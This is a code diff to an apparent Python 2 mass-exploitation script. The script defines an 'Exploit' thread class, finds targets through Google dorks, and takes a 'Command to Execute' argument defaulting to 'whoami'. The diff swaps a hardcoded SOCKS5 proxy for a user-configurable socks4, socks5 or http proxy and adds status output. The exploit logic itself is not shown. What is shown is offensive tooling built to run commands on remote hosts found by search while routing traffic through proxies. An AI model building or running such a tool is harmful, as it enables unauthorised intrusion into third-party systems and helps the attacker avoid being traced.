@@ -1,12 +1,6 @@
-import urllib2, requests, socket
+import urllib2, requests, socket, urlparse
 import Queue, threading, re
 import random, sys, argparse, time
-
-#PROXY CODE START
-import socks
-socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 5555)
-socket.socket = socks.socksocket
-#PROXY CODE END
 
 
 class Exploit(threading.Thread):
@@ -83,10 +77,36 @@ parser.add_argument('-d', dest='dork',
 parser.add_argument('-e', dest='cmd',
                     help="Command to Execute",
                     default="whoami")
+parser.add_argument('-p', dest='proxy',
+                    help="proxy,support:socks4,socks5,http eg: socks5://127.0.0.1:1234 ")
 args = parser.parse_args()
 
 
+#PROXY CODE START
+if args.proxy:
+	try:
+		proxy = urlparse.urlparse(args.proxy)
+		(scheme,host,port) = (proxy.scheme,proxy.hostname,proxy.port)
+		print "[ PROXY ]\t"+ scheme + "://" + host + ":" + str(port)
+		import socks
+		if proxy.scheme == "socks5":
+			proxy_type = socks.PROXY_TYPE_SOCKS5
+		elif proxy.scheme == "socks4":
+			proxy_type = socks.PROXY_TYPE_SOCKS4
+		elif proxy.scheme == "http":
+			proxy_type = socks.PROXY_TYPE_HTTP
+		else:
+			print "Unsupported proxy type!"
+		socks.setdefaultproxy(proxy_type, host, port)
+		socket.socket = socks.socksocket
+	except Exception as e:
+		print e
+#PROXY CODE END
+
 dork = args.dork
+print "[ DORK ]\t"+dork
+print "[ THREAD ]\t"+str(args.thread_count)
+print "[ PAGE ]\t"+str(args.page_count)
 
 payload = Google(dork, args.page_count)
 print "Google Searching..."
